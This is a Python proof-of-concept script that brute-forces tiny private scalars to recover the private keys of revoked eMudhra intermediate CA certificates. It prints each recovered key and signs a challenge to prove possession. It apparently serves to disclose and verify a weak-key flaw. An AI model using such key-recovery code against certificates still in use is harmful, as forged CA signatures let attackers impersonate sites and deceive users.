#!/usr/bin/env python3
"""Recover the private keys of the (revoked) eMudhra intermediate CAs.

Reads PEM certificates, and for each P-384 public key tries d = 1..255
(the keys have a single non-zero byte). Public data only; nothing is
contacted. Usage: .venv/bin/python crack_real.py certs/*.pem
"""
import sys
import time
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec

CURVE = ec.SECP384R1()


def crack(pub, limit=255):
    t = pub.public_numbers()
    for d in range(1, limit + 1):
        p = ec.derive_private_key(d, CURVE).public_key().public_numbers()
        if (p.x, p.y) == (t.x, t.y):
            return d
    return None


def prove(cert, d):
    """Sign a challenge with the recovered key; verify with the cert's public key."""
    key = ec.derive_private_key(d, CURVE)
    msg = b"I hold the private key of " + cert.subject.rfc4514_string().encode()
    sig = key.sign(msg, ec.ECDSA(hashes.SHA384()))
    cert.public_key().verify(sig, msg, ec.ECDSA(hashes.SHA384()))  # raises if bad
    return sig


def main(paths):
    found = {}
    t0 = time.perf_counter()
    for path in map(Path, paths):
        cert = x509.load_pem_x509_certificate(path.read_bytes())
        cn = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        d = crack(cert.public_key())
        status = f"d = {d} (0x{d:02x})" if d else "not in 1..255"
        print(f"{cn:22} issued by {issuer:32} -> {status}")
        if d:
            found.setdefault(d, []).append(cn)
            sig = prove(cert, d)
            raw = d.to_bytes(48, "big").hex()
            print(f"    private key d = {raw[:-2]}\033[1m{raw[-2:]}\033[0m")
            print(f"    signed a challenge, verified against the certificate: "
                  f"OK (sig {sig.hex()[:24]}...)")
    dt = time.perf_counter() - t0
    print(f"\n{len(paths)} certs, {len(found)} distinct weak keys {sorted(found)} "
          f"recovered in {dt:.2f}s")


if __name__ == "__main__":
    main(sys.argv[1:])
